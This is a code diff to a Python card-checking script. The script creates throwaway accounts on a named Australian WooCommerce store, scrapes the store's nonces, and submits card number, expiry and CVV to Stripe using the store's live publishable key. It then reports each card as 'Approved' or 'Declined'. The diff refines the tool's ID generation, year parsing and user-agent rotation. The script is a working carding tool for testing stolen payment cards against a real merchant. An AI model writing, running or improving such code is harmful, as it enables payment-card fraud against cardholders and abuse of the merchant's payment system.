@@ -4,6 +4,7 @@ import re
 import json
 import time
 import string
+import uuid
 
 def generate_random_email():
     """Generate a random email address"""
@@ -20,9 +21,18 @@ def check_card(ccx):
         ccx = ccx.strip()
         parts = ccx.split("|")
         if len(parts) != 4:
-            return {"cc": ccx, "response": "Invalid card format. Use CC|MM|YYYY|CVV", "status": "Declined", "gateway": "Stripe Auth"}
+            return {
+                "cc": ccx,
+                "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
+                "status": "Declined",
+                "gateway": "Stripe AU"
+            }
 
         n, mm, yy, cvc = parts
+        
+        # Handle year format (convert 2029 to 29)
+        if "20" in yy:
+            yy = yy.split("20")[1]
 
         # Create a session
         session = requests.Session()
@@ -31,13 +41,17 @@ def check_card(ccx):
         email = generate_random_email()
         password = generate_random_password()
 
+        # Generate Stripe IDs
+        stripe_mid = str(uuid.uuid4())
+        stripe_sid = str(uuid.uuid4()) + str(int(time.time()))
+
         # Random user-agent
         user_agents = [
             "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
         ]
-        random_user_agent = random.choice(user_agents)
+        user_agent = random.choice(user_agents)
 
         # Step 1: Get the registration page to extract nonce
         headers = {
@@ -55,7 +69,7 @@ def check_card(ccx):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': random_user_agent,
+            'user-agent': user_agent,
         }
 
         response = session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
@@ -63,7 +77,7 @@ def check_card(ccx):
         # Extract registration nonce
         match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', response.text)
         if not match:
-            return {"cc": ccx, "response": "Registration nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": "Registration nonce not found", "status": "Declined", "gateway": "Stripe AU"}
         
         register_nonce = match.group(1)
 
@@ -85,7 +99,7 @@ def check_card(ccx):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': random_user_agent,
+            'user-agent': user_agent,
         }
 
         data = {
@@ -100,7 +114,7 @@ def check_card(ccx):
         
         # Check if registration was successful
         if 'my-account/add-payment-method' not in response.url:
-            return {"cc": ccx, "response": "Account registration failed", "status": "Declined", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": "Account registration failed", "status": "Declined", "gateway": "Stripe AU"}
 
         # Step 3: Get the add payment method page to extract add_card_nonce
         headers = {
@@ -115,7 +129,7 @@ def check_card(ccx):
             'Sec-Fetch-Site': 'same-origin',
             'Sec-Fetch-User': '?1',
             'Upgrade-Insecure-Requests': '1',
-            'User-Agent': random_user_agent,
+            'User-Agent': user_agent,
             'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -126,7 +140,7 @@ def check_card(ccx):
         # Extract add_card_nonce
         match = re.search(r'"add_card_nonce":"([a-zA-Z0-9]+)"', response.text)
         if not match:
-            return {"cc": ccx, "response": "add_card_nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": "add_card_nonce not found", "status": "Declined", "gateway": "Stripe AU"}
 
         add_card_nonce = match.group(1)
 
@@ -145,13 +159,13 @@ def check_card(ccx):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-site',
-            'user-agent': random_user_agent,
+            'user-agent': user_agent,
         }
 
         # Generate random IDs for Stripe
         guid = ''.join(random.choices('abcdef0123456789', k=32)) + ''.join(random.choices('abcdef0123456789', k=16))
-        muid = ''.join(random.choices('abcdef0123456789', k=32)) + ''.join(random.choices('abcdef0123456789', k=16))
-        sid = ''.join(random.choices('abcdef0123456789', k=32)) + ''.join(random.choices('abcdef0123456789', k=16))
+        muid = stripe_mid
+        sid = stripe_sid
 
         data = f'referrer=https%3A%2F%2Fthefloordepot.com.au&type=card&owner[name]=+&owner[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F41ba105bc6%3B+stripe-js-v3%2F41ba105bc6%3B+split-card-element&time_on_page={random.randint(60000, 70000)}&key=pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
 
@@ -162,12 +176,12 @@ def check_card(ccx):
             error_code = stripe_response['error']['code']
             error_message = stripe_response['error']['message']
             if error_code == 'card_declined':
-                return {"cc": ccx, "response": "Card was declined", "status": "Declined", "gateway": "Stripe Auth"}
-            return {"cc": ccx, "response": error_message, "status": "Declined", "gateway": "Stripe Auth"}
+                return {"cc": ccx, "response": "Card was declined", "status": "Declined", "gateway": "Stripe AU"}
+            return {"cc": ccx, "response": error_message, "status": "Declined", "gateway": "Stripe AU"}
 
         id = stripe_response.get('id', '')
         if not id:
-            return {"cc": ccx, "response": "Payment source creation failed", "status": "Declined", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": "Payment source creation failed", "status": "Declined", "gateway": "Stripe AU"}
 
         # Step 5: Create setup intent
         headers = {
@@ -182,7 +196,7 @@ def check_card(ccx):
             'Sec-Fetch-Dest': 'empty',
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Site': 'same-origin',
-            'User-Agent': random_user_agent,
+            'User-Agent': user_agent,
             'X-Requested-With': 'XMLHttpRequest',
             'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
             'sec-ch-ua-mobile': '?0',
@@ -203,23 +217,23 @@ def check_card(ccx):
         try:
             setup_data = response.json()
         except json.JSONDecodeError:
-            return {"cc": ccx, "response": "Invalid JSON response from server", "status": "Declined", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": "Invalid JSON response from server", "status": "Declined", "gateway": "Stripe AU"}
 
         if setup_data.get('success', False):
             data_status = setup_data['data'].get('status')
             if data_status == 'requires_action':
-                return {"cc": ccx, "response": "OTP_REQUIRED", "status": "Approved", "gateway": "Stripe Auth"}
+                return {"cc": ccx, "response": "Action Required", "status": "Approved", "gateway": "Stripe Auth 2"}
             elif data_status == 'succeeded':
-                return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth"}
+                return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth 2"}
             elif 'error' in setup_data['data']:
                 error_msg = setup_data['data']['error'].get('message', 'Unknown error')
-                return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth"}
+                return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth 2"}
 
         if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
             error_msg = setup_data['data']['error'].get('message', 'Unknown error')
-            return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth 2"}
 
-        return {"cc": ccx, "response": str(setup_data), "status": "Declined", "gateway": "Stripe Auth"}
+        return {"cc": ccx, "response": str(setup_data), "status": "Declined", "gateway": "Stripe Auth 2"}
 
     except Exception as e:
-        return {"cc": ccx, "response": f"Setup Intent Failed: {str(e)}", "status": "Declined", "gateway": "Stripe Auth"}
+        return {"cc": ccx, "response": f"Setup Intent Failed: {str(e)}", "status": "Declined", "gateway": "Stripe Auth 2"}
